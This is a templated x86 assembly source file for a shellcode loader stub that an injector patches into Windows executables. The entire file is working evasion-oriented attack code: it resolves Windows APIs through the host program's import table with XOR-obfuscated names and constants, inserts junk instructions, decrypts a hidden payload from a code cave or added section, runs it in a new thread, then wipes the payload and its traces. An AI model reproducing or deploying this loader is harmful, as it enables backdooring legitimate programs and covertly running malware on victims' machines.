.code32

// edi store address of ImageBaseAddress
// esi store address of kernel32.dll
// ebx store address of LoadLibrary
// ebp store address of GetProcAddress
// [esp+0x08] store address of VirtualAlloc
// [esp+0x0C] store address of VirtualFree
// [esp+0x10] store address of VirtualProtect
// [esp+0x14] store address of CreateThread
// [esp+0x18] store address of WaitForSingleObject
// [esp+0x1C] store address of allocated memory page
// [esp+0x20] store the last error
// 0x21082520 is a stub that will be replaced by injector

entry:
// ================================ prepare environment ================================

  // ensure stack is 16 bytes aligned
  push {{.RegN.ebp}}                                           {{iji}}
  mov {{.RegN.ebp}}, esp                                       {{iji}}
  mov {{.RegV.eax}}, {{.RegN.ebp}}                             {{iji}}
  and {{.RegV.eax}}, 0x0F                                      {{iji}}
  sub esp, {{.RegV.eax}}                                       {{iji}}
  push {{.RegN.ebp}}                                           {{iji}}

  // reserve stack for store variables
  sub esp, 0x20                                                {{iji}}
  sub esp, 0x0C                                                {{iji}}

{{if .NeedSaveLastError}}
  // save the last error to stack
  xor {{.Reg.eax}}, {{.Reg.eax}}                               {{iji}}
  add {{.Reg.eax}}, 0x18                                       {{iji}}
  mov {{.Reg.ebx}}, fs:[{{.Reg.eax}}]                          {{iji}}
  mov {{.Reg.ecx}}, [{{.Reg.ebx}}+0x34]                        {{iji}}
  mov [esp+0x20], {{.Reg.ecx}}                                 {{iji}}
{{end}}

// =============================== get procedure address ===============================

{{if .LackProcedure}}
  // push kernel32 module name to stack
  mov {{.Reg.eax}}, {{index .Kernel32DLLDB  0}}                {{iji}}
  mov {{.Reg.ecx}}, {{index .Kernel32DLLKey 0}}                {{iji}}
  xor {{.Reg.eax}}, {{.Reg.ecx}}                               {{iji}}
  push {{.Reg.eax}}                                            {{iji}}
  mov {{.Reg.ebx}}, {{index .Kernel32DLLDB  1}}                {{iji}}
  mov {{.Reg.edx}}, {{index .Kernel32DLLKey 1}}                {{iji}}
  xor {{.Reg.ebx}}, {{.Reg.edx}}                               {{iji}}
  push {{.Reg.ebx}}                                            {{iji}}
  mov {{.Reg.edx}}, {{index .Kernel32DLLDB  2}}                {{iji}}
  mov {{.Reg.ebp}}, {{index .Kernel32DLLKey 2}}                {{iji}}
  xor {{.Reg.edx}}, {{.Reg.ebp}}                               {{iji}}
  push {{.Reg.edx}}                                            {{iji}}
  mov {{.Reg.edi}}, {{index .Kernel32DLLDB  3}}                {{iji}}
  mov {{.Reg.esi}}, {{index .Kernel32DLLKey 3}}                {{iji}}
  xor {{.Reg.edi}}, {{.Reg.esi}}                               {{iji}}
  push {{.Reg.edi}}                                            {{iji}}

  {{if .LoadLibraryWOnly}}
    mov {{.Reg.ebx}}, {{index .Kernel32DLLDB  4}}              {{iji}}
    mov {{.Reg.edx}}, {{index .Kernel32DLLKey 4}}              {{iji}}
    xor {{.Reg.ebx}}, {{.Reg.edx}}                             {{iji}}
    push {{.Reg.ebx}}                                          {{iji}}
    mov {{.Reg.edi}}, {{index .Kernel32DLLDB  5}}              {{iji}}
    mov {{.Reg.esi}}, {{index .Kernel32DLLKey 5}}              {{iji}}
    xor {{.Reg.edi}}, {{.Reg.esi}}                             {{iji}}
    push {{.Reg.edi}}                                          {{iji}}
    mov {{.Reg.eax}}, {{index .Kernel32DLLDB  6}}              {{iji}}
    mov {{.Reg.ecx}}, {{index .Kernel32DLLKey 6}}              {{iji}}
    xor {{.Reg.eax}}, {{.Reg.ecx}}                             {{iji}}
    push {{.Reg.eax}}                                          {{iji}}
  {{end}}

  // calculate image base address
  call get_eip
  mov {{.RegN.edi}}, {{.Reg.eax}}
  sub {{.RegN.edi}}, 0x21082520

  // read the LoadLibraryA/W form IAT
  mov {{.RegN.ebx}}, {{.RegN.edi}}                             {{iji}}
  add {{.RegN.ebx}}, {{hex .LoadLibrary}}                      {{iji}}
  mov {{.RegN.ebx}}, [{{.RegN.ebx}}]                           {{iji}}

  // load kernel32.dll
  push esp                 {{iji}} // lpLibFileName
  call {{.RegN.ebx}}       {{iji}} // call LoadLibraryA/W

  // store the handle of kernel32.dll
  mov {{.RegN.esi}}, eax                                       {{iji}}

  // restore stack for kernel32 module name
  {{if .LoadLibraryWOnly}}
    add esp, 7*4                                               {{iji}}
  {{else}}
    add esp, 4*4                                               {{iji}}
  {{end}}

  // read the GetProcAddress form IAT
  mov {{.RegV.eax}}, {{.RegN.edi}}                             {{iji}}
  add {{.RegV.eax}}, {{hex .GetProcAddress}}                   {{iji}}
  mov {{.RegN.ebp}}, [{{.RegV.eax}}]                           {{iji}}

  // get procedure address of VirtualAlloc
  {{if .LackVirtualAlloc}}
    // push procedure name to stack
    mov {{.RegV.eax}}, {{index .VirtualAllocDB  0}}            {{iji}}
    mov {{.RegV.ecx}}, {{index .VirtualAllocKey 0}}            {{iji}}
    xor {{.RegV.eax}}, {{.RegV.ecx}}                           {{iji}}
    push {{.RegV.eax}}                                         {{iji}}
    mov {{.RegV.ecx}}, {{index .VirtualAllocDB  1}}            {{iji}}
    mov {{.RegV.edx}}, {{index .VirtualAllocKey 1}}            {{iji}}
    xor {{.RegV.ecx}}, {{.RegV.edx}}                           {{iji}}
    push {{.RegV.ecx}}                                         {{iji}}
    mov {{.RegV.eax}}, {{index .VirtualAllocDB  2}}            {{iji}}
    mov {{.RegV.ecx}}, {{index .VirtualAllocKey 2}}            {{iji}}
    xor {{.RegV.eax}}, {{.RegV.ecx}}                           {{iji}}
    push {{.RegV.eax}}                                         {{iji}}
    mov {{.RegV.ecx}}, {{index .VirtualAllocDB  3}}            {{iji}}
    mov {{.RegV.edx}}, {{index .VirtualAllocKey 3}}            {{iji}}
    xor {{.RegV.ecx}}, {{.RegV.edx}}                           {{iji}}
    push {{.RegV.ecx}}                                         {{iji}}
    push esp               {{iji}} // lpProcName
    push {{.RegN.esi}}     {{iji}} // hModule
    call {{.RegN.ebp}}     {{iji}} // call GetProcAddress
    // restore stack for procedure name
    add esp, 4*4                                               {{iji}}
    // store procedure address to stack
    mov [esp+0x08], eax                                        {{iji}}
  {{else}}
    mov {{.RegV.ecx}}, {{.RegN.edi}}                           {{iji}}
    add {{.RegV.ecx}}, {{hex .VirtualAlloc}}                   {{iji}}
    mov {{.RegV.ecx}}, [{{.RegV.ecx}}]                         {{iji}}
    mov [esp+0x08], {{.RegV.ecx}}                              {{iji}}
  {{end}}

  // get procedure address of VirtualFree
  {{if .NeedEraseShellcode}}
    {{if .LackVirtualFree}}
      // push procedure name to stack
      mov {{.RegV.ecx}}, {{index .VirtualFreeDB  0}}           {{iji}}
      mov {{.RegV.eax}}, {{index .VirtualFreeKey 0}}           {{iji}}
      xor {{.RegV.ecx}}, {{.RegV.eax}}                         {{iji}}
      push {{.RegV.ecx}}                                       {{iji}}
      mov {{.RegV.edx}}, {{index .VirtualFreeDB  1}}           {{iji}}
      mov {{.RegV.ecx}}, {{index .VirtualFreeKey 1}}           {{iji}}
      xor {{.RegV.edx}}, {{.RegV.ecx}}                         {{iji}}
      push {{.RegV.edx}}                                       {{iji}}
      mov {{.RegV.eax}}, {{index .VirtualFreeDB  2}}           {{iji}}
      mov {{.RegV.edx}}, {{index .VirtualFreeKey 2}}           {{iji}}
      xor {{.RegV.eax}}, {{.RegV.edx}}                         {{iji}}
      push {{.RegV.eax}}                                       {{iji}}
      push esp             {{iji}} // lpProcName
      push {{.RegN.esi}}   {{iji}} // hModule
      call {{.RegN.ebp}}   {{iji}} // call GetProcAddress
      // restore stack for procedure name
      add esp, 3*4                                             {{iji}}
      // store procedure address to stack
      mov [esp+0x0C], eax                                      {{iji}}
    {{else}}
      mov {{.RegV.ecx}}, {{.RegN.edi}}                         {{iji}}
      add {{.RegV.ecx}}, {{hex .VirtualFree}}                  {{iji}}
      mov {{.RegV.ecx}}, [{{.RegV.ecx}}]                       {{iji}}
      mov [esp+0x0C], {{.RegV.ecx}}                            {{iji}}
    {{end}}
  {{end}}

  // get procedure address of VirtualProtect
  {{if .LackVirtualProtect}}
    // push procedure name to stack
    mov {{.RegV.ecx}}, {{index .VirtualProtectDB  0}}          {{iji}}
    mov {{.RegV.eax}}, {{index .VirtualProtectKey 0}}          {{iji}}
    xor {{.RegV.ecx}}, {{.RegV.eax}}                           {{iji}}
    push {{.RegV.ecx}}                                         {{iji}}
    mov {{.RegV.edx}}, {{index .VirtualProtectDB  1}}          {{iji}}
    mov {{.RegV.ecx}}, {{index .VirtualProtectKey 1}}          {{iji}}
    xor {{.RegV.edx}}, {{.RegV.ecx}}                           {{iji}}
    push {{.RegV.edx}}                                         {{iji}}
    mov {{.RegV.eax}}, {{index .VirtualProtectDB  2}}          {{iji}}
    mov {{.RegV.edx}}, {{index .VirtualProtectKey 2}}          {{iji}}
    xor {{.RegV.eax}}, {{.RegV.edx}}                           {{iji}}
    push {{.RegV.eax}}                                         {{iji}}
    mov {{.RegV.edx}}, {{index .VirtualProtectDB  3}}          {{iji}}
    mov {{.RegV.ecx}}, {{index .VirtualProtectKey 3}}          {{iji}}
    xor {{.RegV.edx}}, {{.RegV.ecx}}                           {{iji}}
    push {{.RegV.edx}}                                         {{iji}}
    push esp               {{iji}} // lpProcName
    push {{.RegN.esi}}     {{iji}} // hModule
    call {{.RegN.ebp}}     {{iji}} // call GetProcAddress
    // restore stack for procedure name
    add esp, 4*4                                               {{iji}}
    // store procedure address to stack
    mov [esp+0x10], eax                                        {{iji}}
  {{else}}
    mov {{.RegV.edx}}, {{.RegN.edi}}                           {{iji}}
    add {{.RegV.edx}}, {{hex .VirtualProtect}}                 {{iji}}
    mov {{.RegV.edx}}, [{{.RegV.edx}}]                         {{iji}}
    mov [esp+0x10], {{.RegV.edx}}                              {{iji}}
  {{end}}

  // get procedure address of CreateThread
  {{if .NeedCreateThread}}
    {{if .LackCreateThread}}
      // push procedure name to stack
      mov {{.RegV.ecx}}, {{index .CreateThreadDB  0}}          {{iji}}
      mov {{.RegV.eax}}, {{index .CreateThreadKey 0}}          {{iji}}
      xor {{.RegV.ecx}}, {{.RegV.eax}}                         {{iji}}
      push {{.RegV.ecx}}                                       {{iji}}
      mov {{.RegV.edx}}, {{index .CreateThreadDB  1}}          {{iji}}
      mov {{.RegV.ecx}}, {{index .CreateThreadKey 1}}          {{iji}}
      xor {{.RegV.edx}}, {{.RegV.ecx}}                         {{iji}}
      push {{.RegV.edx}}                                       {{iji}}
      mov {{.RegV.eax}}, {{index .CreateThreadDB  2}}          {{iji}}
      mov {{.RegV.edx}}, {{index .CreateThreadKey 2}}          {{iji}}
      xor {{.RegV.eax}}, {{.RegV.edx}}                         {{iji}}
      push {{.RegV.eax}}                                       {{iji}}
      mov {{.RegV.edx}}, {{index .CreateThreadDB  3}}          {{iji}}
      mov {{.RegV.ecx}}, {{index .CreateThreadKey 3}}          {{iji}}
      xor {{.RegV.edx}}, {{.RegV.ecx}}                         {{iji}}
      push {{.RegV.edx}}                                       {{iji}}
      push esp             {{iji}} // lpProcName
      push {{.RegN.esi}}   {{iji}} // hModule
      call {{.RegN.ebp}}   {{iji}} // call GetProcAddress
      // restore stack for procedure name
      add esp, 4*4                                             {{iji}}
      // store procedure address to stack
      mov [esp+0x14], eax                                      {{iji}}
    {{else}}
      mov {{.RegV.eax}}, {{.RegN.edi}}                         {{iji}}
      add {{.RegV.eax}}, {{hex .CreateThread}}                 {{iji}}
      mov {{.RegV.eax}}, [{{.RegV.eax}}]                       {{iji}}
      mov [esp+0x14], {{.RegV.eax}}                            {{iji}}
    {{end}}
  {{end}}

  // get procedure address of WaitForSingleObject
  {{if .NeedWaitThread}}
    {{if .LackWaitForSingleObject}}
      // push procedure name to stack
      mov {{.RegV.ecx}}, {{index .WaitForSingleObjectDB  0}}   {{iji}}
      mov {{.RegV.eax}}, {{index .WaitForSingleObjectKey 0}}   {{iji}}
      xor {{.RegV.ecx}}, {{.RegV.eax}}                         {{iji}}
      push {{.RegV.ecx}}                                       {{iji}}
      mov {{.RegV.edx}}, {{index .WaitForSingleObjectDB  1}}   {{iji}}
      mov {{.RegV.ecx}}, {{index .WaitForSingleObjectKey 1}}   {{iji}}
      xor {{.RegV.edx}}, {{.RegV.ecx}}                         {{iji}}
      push {{.RegV.edx}}                                       {{iji}}
      mov {{.RegV.eax}}, {{index .WaitForSingleObjectDB  2}}   {{iji}}
      mov {{.RegV.edx}}, {{index .WaitForSingleObjectKey 2}}   {{iji}}
      xor {{.RegV.eax}}, {{.RegV.edx}}                         {{iji}}
      push {{.RegV.eax}}                                       {{iji}}
      mov {{.RegV.edx}}, {{index .WaitForSingleObjectDB  3}}   {{iji}}
      mov {{.RegV.ecx}}, {{index .WaitForSingleObjectKey 3}}   {{iji}}
      xor {{.RegV.edx}}, {{.RegV.ecx}}                         {{iji}}
      push {{.RegV.edx}}                                       {{iji}}
      mov {{.RegV.ecx}}, {{index .WaitForSingleObjectDB  4}}   {{iji}}
      mov {{.RegV.eax}}, {{index .WaitForSingleObjectKey 4}}   {{iji}}
      xor {{.RegV.ecx}}, {{.RegV.eax}}                         {{iji}}
      push {{.RegV.ecx}}                                       {{iji}}
      push esp             {{iji}} // lpProcName
      push {{.RegN.esi}}   {{iji}} // hModule
      call {{.RegN.ebp}}   {{iji}} // call GetProcAddress
      // restore stack for procedure name
      add esp, 5*4                                             {{iji}}
      // store procedure address to stack
      mov [esp+0x18], eax                                      {{iji}}
    {{else}}
      mov {{.RegV.ecx}}, {{.RegN.edi}}                         {{iji}}
      add {{.RegV.ecx}}, {{hex .WaitForSingleObject}}          {{iji}}
      mov {{.RegV.ecx}}, [{{.RegV.ecx}}]                       {{iji}}
      mov [esp+0x18], {{.RegV.ecx}}                            {{iji}}
    {{end}}
  {{end}}
{{else}}
  // calculate image base address
  call get_eip
  mov {{.RegN.edi}}, {{.Reg.eax}}
  sub {{.RegN.edi}}, 0x21082520
  // get procedure address of VirtualAlloc
  mov {{.RegV.eax}}, {{.RegN.edi}}                             {{iji}}
  add {{.RegV.eax}}, {{hex .VirtualAlloc}}                     {{iji}}
  mov {{.RegV.eax}}, [{{.RegV.eax}}]                           {{iji}}
  mov [esp+0x08], {{.RegV.eax}}                                {{iji}}
  // get procedure address of VirtualFree
  {{if .NeedEraseShellcode}}
    mov {{.RegV.ecx}}, {{.RegN.edi}}                           {{iji}}
    add {{.RegV.ecx}}, {{hex .VirtualFree}}                    {{iji}}
    mov {{.RegV.ecx}}, [{{.RegV.ecx}}]                         {{iji}}
    mov [esp+0x0C], {{.RegV.ecx}}                              {{iji}}
  {{end}}
  // get procedure address of VirtualProtect
  mov {{.RegV.edx}}, {{.RegN.edi}}                             {{iji}}
  add {{.RegV.edx}}, {{hex .VirtualProtect}}                   {{iji}}
  mov {{.RegV.edx}}, [{{.RegV.edx}}]                           {{iji}}
  mov [esp+0x10], {{.RegV.edx}}                                {{iji}}
  // get procedure address of CreateThread
  {{if .NeedCreateThread}}
    mov {{.RegV.eax}}, {{.RegN.edi}}                           {{iji}}
    add {{.RegV.eax}}, {{hex .CreateThread}}                   {{iji}}
    mov {{.RegV.eax}}, [{{.RegV.eax}}]                         {{iji}}
    mov [esp+0x14], {{.RegV.eax}}                              {{iji}}
  {{end}}
  // get procedure address of WaitForSingleObject
  {{if .NeedWaitThread}}
    mov {{.RegV.ecx}}, {{.RegN.edi}}                           {{iji}}
    add {{.RegV.ecx}}, {{hex .WaitForSingleObject}}            {{iji}}
    mov {{.RegV.ecx}}, [{{.RegV.ecx}}]                         {{iji}}
    mov [esp+0x18], {{.RegV.ecx}}                              {{iji}}
  {{end}}
{{end}} // LackProcedure

// ================================ prepare memory page ================================

  // allocate memory for shellcode
  mov  {{.RegV.eax}}, [esp+0x08]                               {{iji}} // address of VirtualAlloc
  mov  {{.RegV.ecx}}, {{hex .PAData.Protect}}                  {{iji}} // PAGE_READWRITE
  xor  {{.RegV.ecx}}, {{hex .PAKey.Protect}}                   {{iji}} // decrypt argument
  push {{.RegV.ecx}}                                           {{iji}} // push arugment
  mov  {{.RegV.edx}}, {{hex .PAData.AllocationType}}           {{iji}} // MEM_RESERVE|MEM_COMMIT
  xor  {{.RegV.edx}}, {{hex .PAKey.AllocationType}}            {{iji}} // decrypt argument
  push {{.RegV.edx}}                                           {{iji}} // push arugment
  mov  {{.RegV.ecx}}, {{hex .MemRegionSize}}                   {{iji}} // dwSize
  push {{.RegV.ecx}}                                           {{iji}} // push arugment
  xor  {{.RegV.edx}}, {{.RegV.edx}}                            {{iji}} // lpAddress
  push {{.RegV.edx}}                                           {{iji}} // push arugment
  call {{.RegV.eax}}                                           {{iji}} // call VirtualAlloc

  // store allocated memory address
  mov [esp+0x1C], eax                                          {{iji}}

  // padding garbage data to page
  mov {{.RegV.edx}}, eax                                       {{iji}}
  mov {{.RegV.ecx}}, {{hex .EntryOffset}}                      {{iji}}
  // calculate a random seed from registers
  add {{.RegV.eax}}, esp                                       {{iji}}
  add {{.RegV.eax}}, {{.Reg.ebx}}                              {{iji}}
  add {{.RegV.eax}}, {{.Reg.ecx}}                              {{iji}}
  add {{.RegV.eax}}, {{.Reg.edx}}                              {{iji}}
  add {{.RegV.eax}}, {{.Reg.esi}}                              {{iji}}
  add {{.RegV.eax}}, {{.Reg.edi}}                              {{iji}}
 loop_padding:
  // it will waste some loop but clean code
  call xor_shift                                               {{iji}}
  mov [{{.RegV.edx}}], {{.RegV.eax}}                           {{iji}}
  // check padding garbage is finish
  inc {{.RegV.edx}}                                            {{iji}}
  dec {{.RegV.ecx}}                                            {{iji}}
  jnz loop_padding                                             {{iji}}

// ================================= prepare shellcode =================================

{{if .CodeCaveMode}}
  // extract encrypted shellcode from code cave
  push {{.RegN.edi}}                               {{iji}} // save "edi"
  mov {{.RegN.ebx}}, {{hex .PayloadKey}}           {{iji}} // key of encrypted shellcode
  mov {{.RegN.edi}}, [esp+0x04+0x1C]               {{iji}} // address of allocated memory page
  add {{.RegN.edi}}, {{hex .EntryOffset}}          {{iji}} // address of shellcode
  {{STUB CodeCaveMode STUB}}
  pop {{.RegN.edi}}                                {{iji}} // restore "edi"
{{end}}

{{if or .CodeCaveNSMode .ExtendTextMode .ExtendTextNSMode .CreateTextMode}}
  // save esi and edi
  push esi                                         {{iji}}
  push edi                                         {{iji}}

  // extract encrypted shellcode from section
  mov esi, {{.RegN.edi}}                           {{iji}} // address of image base
  add esi, {{hex .PayloadRVA}}                     {{iji}} // address of encrypted shellcode
  mov edi, [esp+0x08+0x1C]                         {{iji}} // address of allocated memory page
  add edi, {{hex .EntryOffset}}                    {{iji}} // address of shellcode
  mov {{.RegV.ecx}}, {{hex .PayloadSize}}          {{iji}} // set loop times
 loop_extract:
  movsb                                            {{iji}}
  inc esi                                          {{iji}}
  // check extract shellcode is finish
  dec {{.RegV.ecx}}                                {{iji}}
  jnz loop_extract                                 {{iji}}

  // decrypt shellcode in the memory page
  mov {{.RegV.eax}}, {{hex .PayloadKey}}           {{iji}} // key of encrypted shellcode
  mov {{.RegV.edx}}, [esp+0x08+0x1C]               {{iji}} // address of allocated memory page
  add {{.RegV.edx}}, {{hex .EntryOffset}}          {{iji}} // address of shellcode
  mov {{.RegV.ecx}}, {{hex .PayloadSize}}          {{iji}} // set loop times
 loop_decrypt:
  mov edi, [{{.RegV.edx}}]                         {{iji}}
  xor edi, {{.RegV.eax}}                           {{iji}}
  mov [{{.RegV.edx}}], edi                         {{iji}}
  // update the key with xorshift32
  call xor_shift                                   {{iji}}
  // check decrypt shellcode is finish
  add {{.RegV.edx}}, 4                             {{iji}}
  sub {{.RegV.ecx}}, 4                             {{iji}}
  jnz loop_decrypt                                 {{iji}}

  // restore edi and esi
  pop edi                                          {{iji}}
  pop esi                                          {{iji}}
{{end}}

// ================================== execute shellcode ==================================

  // adjust memory region protect before execute
  mov  {{.RegV.eax}}, [esp+0x10]                   {{iji}} // address of VirtualProtect
  mov  {{.RegV.ecx}}, [esp+0x1C]                   {{iji}} // lpAddress
  sub esp, 0x04                                    {{iji}} // lpflOldProtect
  push esp                                         {{iji}} // push argument
  mov  {{.RegV.edx}}, {{hex .PAData.NewProtect}}   {{iji}} // flNewProtect
  xor  {{.RegV.edx}}, {{hex .PAKey.NewProtect}}    {{iji}} // decrypt argument
  push {{.RegV.edx}}                               {{iji}} // push argument
  mov  {{.RegV.edx}}, {{hex .MemRegionSize}}       {{iji}} // dwSize
  push {{.RegV.edx}}                               {{iji}} // push argument
  mov  {{.RegV.edx}}, {{.RegV.ecx}}                {{iji}} // lpAddress
  push {{.RegV.edx}}                               {{iji}} // push argument
  call {{.RegV.eax}}                               {{iji}} // call VirtualProtect
  add esp, 0x04                                    {{iji}} // restore stack for old protect
  
{{if .NeedCreateThread}}
  {{if .NeedShellcodeJumper}}
    mov {{.RegV.ecx}}, {{.RegN.edi}}               {{iji}} // address of image base
    add {{.RegV.ecx}}, {{hex .JumperRVA}}          {{iji}} // address of shellcode jumper
    mov {{.RegV.edx}}, [esp+0x1C]                  {{iji}} // address of memory page
    add {{.RegV.edx}}, {{hex .EntryOffset}}        {{iji}} // address of shellcode
  {{else}}
    mov {{.RegV.ecx}}, [esp+0x1C]                  {{iji}} // address of memory page
    add {{.RegV.ecx}}, {{hex .EntryOffset}}        {{iji}} // address of shellcode
    xor {{.RegV.edx}}, {{.RegV.edx}}               {{iji}} // clear register for lpParameter
  {{end}}

  xor {{.RegV.eax}}, {{.RegV.eax}}                 {{iji}} // clear register for push 0
  push {{.RegV.eax}}                               {{iji}} // lpThreadId
  push {{.RegV.eax}}                               {{iji}} // dwCreationFlags
  push {{.RegV.edx}}                               {{iji}} // lpParameter
  push {{.RegV.ecx}}                               {{iji}} // lpStartAddress
  push {{.RegV.eax}}                               {{iji}} // dwStackSize
  push {{.RegV.eax}}                               {{iji}} // lpThreadAttributes
  mov {{.RegV.eax}}, [esp+0x2C]                    {{iji}} // address of CreateThread
  call {{.RegV.eax}}                               {{iji}} // call CreateThread

  {{if .NeedWaitThread}}
    mov edx, {{hex .PAData.Infinite}}              {{iji}} // dwMilliseconds, INFINITE
    xor edx, {{hex .PAKey.Infinite}}               {{iji}} // decrypt argument
    push edx                                       {{iji}} // push argument
    push eax                                       {{iji}} // hHandle, hThread
    mov {{.RegV.eax}}, [esp+0x20]                  {{iji}} // address of WaitForSingleObject
    call {{.RegV.eax}}                             {{iji}} // call WaitForSingleObject
  {{end}}
{{else}}
  mov {{.RegV.eax}}, [esp+0x1C]                    {{iji}} // address of allocated memory
  add {{.RegV.eax}}, {{hex .EntryOffset}}          {{iji}} // address of shellcode
  call {{.RegV.eax}}                               {{iji}} // call shellcode
{{end}}

// =================================== erase shellcode ===================================

{{if .NeedEraseShellcode}}
  {{if not .UseRWXPage}}
    // adjust memory region protect before erase
    mov  {{.RegV.eax}}, [esp+0x10]                 {{iji}} // address of VirtualProtect
    mov  {{.RegV.ecx}}, [esp+0x1C]                 {{iji}} // lpAddress
    sub esp, 0x04                                  {{iji}} // lpflOldProtect
    push esp                                       {{iji}} // push argument
    mov  {{.RegV.edx}}, {{hex .PAData.Protect}}    {{iji}} // PAGE_READWRITE
    xor  {{.RegV.edx}}, {{hex .PAKey.Protect}}     {{iji}} // decrypt argument
    push {{.RegV.edx}}                             {{iji}} // push argument
    mov  {{.RegV.edx}}, {{hex .MemRegionSize}}     {{iji}} // dwSize
    push {{.RegV.edx}}                             {{iji}} // push argument
    mov  {{.RegV.edx}}, {{.RegV.ecx}}              {{iji}} // lpAddress
    push {{.RegV.edx}}                             {{iji}} // push argument
    call {{.RegV.eax}}                             {{iji}} // call VirtualProtect
    add esp, 0x04                                  {{iji}} // restore stack for old protect
  {{end}}

  // overwrite memory data
  mov {{.RegV.edx}}, [esp+0x1C]                    {{iji}} // address of memory page
  add {{.RegV.edx}}, {{hex .EntryOffset}}          {{iji}} // address of shellcode
  mov {{.RegV.ecx}}, {{hex .PayloadSize}}          {{iji}} // set loop times
  sub {{.RegV.ecx}}, 3                             {{iji}} // adjust loop times
  // calculate a random seed from registers
  add {{.RegV.eax}}, esp                           {{iji}}
  add {{.RegV.eax}}, {{.Reg.ebx}}                  {{iji}}
  add {{.RegV.eax}}, {{.Reg.ecx}}                  {{iji}}
  add {{.RegV.eax}}, {{.Reg.edx}}                  {{iji}}
  add {{.RegV.eax}}, {{.Reg.esi}}                  {{iji}}
  add {{.RegV.eax}}, {{.Reg.edi}}                  {{iji}}
 loop_erase:
  // it will waste some loop but clean code
  call xor_shift                                   {{iji}}
  mov [{{.RegV.edx}}], {{.RegV.eax}}               {{iji}}
  // check erase instruction is finish
  inc {{.RegV.edx}}                                {{iji}}
  dec {{.RegV.ecx}}                                {{iji}}
  jnz loop_erase                                   {{iji}}

  // release allocated memory page
  mov {{.RegV.eax}}, [esp+0x0C]                    {{iji}} // address of VirtualFree
  mov {{.RegV.ecx}}, [esp+0x1C]                    {{iji}} // address of allocated memory
  mov {{.RegV.edx}}, {{hex .PAData.FreeType}}      {{iji}} // dwFreeType MEM_RELEASE
  xor {{.RegV.edx}}, {{hex .PAKey.FreeType}}       {{iji}} // decrypt argument
  push {{.RegV.edx}}                               {{iji}} // push argument
  xor {{.RegV.edx}}, {{.RegV.edx}}                 {{iji}} // dwSize
  push {{.RegV.edx}}                               {{iji}} // push argument
  push {{.RegV.ecx}}                               {{iji}} // lpAddress
  call {{.RegV.eax}}                               {{iji}} // call VirtualFree
{{end}}

// ================================== clean environment ==================================

{{if .NeedSaveLastError}}
  // store return value about VirtualFree
  push eax                                                     {{iji}}
  // restore the last error from stack
  xor {{.RegV.eax}}, {{.RegV.eax}}                             {{iji}}
  add {{.RegV.eax}}, 0x18                                      {{iji}}
  mov {{.RegV.ecx}}, fs:[{{.RegV.eax}}]                        {{iji}}
  mov {{.RegV.edx}}, [esp+0x20]                                {{iji}}
  mov [{{.RegV.ecx}}+0x34], {{.RegV.edx}}                      {{iji}}
  // restore return value about VirtualFree
  pop eax                                                      {{iji}}
{{end}}

  // clear volatile register that store sensitive data
  xor {{.RegN.edi}}, {{.RegN.edi}}                             {{iji}}
  xor {{.RegN.esi}}, {{.RegN.esi}}                             {{iji}}
  xor {{.RegN.ebx}}, {{.RegN.ebx}}                             {{iji}}
  xor {{.RegN.ebp}}, {{.RegN.ebp}}                             {{iji}}

  // clear stack that store sensitive data
  mov [esp+0x08], {{.RegN.esi}}                                {{iji}}
  mov [esp+0x0C], {{.RegN.ebx}}                                {{iji}}
  mov [esp+0x10], {{.RegN.ebp}}                                {{iji}}
  mov [esp+0x14], {{.RegN.edi}}                                {{iji}}
  mov [esp+0x18], {{.RegN.esi}}                                {{iji}}
  mov [esp+0x1C], {{.RegN.edi}}                                {{iji}}
  mov [esp+0x20], {{.RegN.ebx}}                                {{iji}}

  // restore stack for store variables
  add esp, 0x0C                                                {{iji}}
  add esp, 0x20                                                {{iji}}

  // restore stack and ebp
  pop {{.RegN.ebp}}                                            {{iji}}
  mov esp, {{.RegN.ebp}}                                       {{iji}}
  pop {{.RegN.ebp}}                                            {{iji}}

  // mark the end of loader
  {{db .EndOfLoader}}

// ====================================== function =======================================

get_eip:
  pop  {{.Reg.eax}}                                            {{iji}}
  push {{.Reg.eax}}                                            {{iji}}
  ret                                                          {{iji}}

xor_shift:
  push {{.RegV.ecx}}                                           {{iji}}
  mov {{.RegV.ecx}}, {{.RegV.eax}}                             {{iji}}
  shl {{.RegV.ecx}}, 13                                        {{iji}}
  xor {{.RegV.eax}}, {{.RegV.ecx}}                             {{iji}}
  mov {{.RegV.ecx}}, {{.RegV.eax}}                             {{iji}}
  shr {{.RegV.ecx}}, 17                                        {{iji}}
  xor {{.RegV.eax}}, {{.RegV.ecx}}                             {{iji}}
  mov {{.RegV.ecx}}, {{.RegV.eax}}                             {{iji}}
  shl {{.RegV.ecx}}, 5                                         {{iji}}
  xor {{.RegV.eax}}, {{.RegV.ecx}}                             {{iji}}
  pop {{.RegV.ecx}}                                            {{iji}}
  ret                                                          {{iji}}
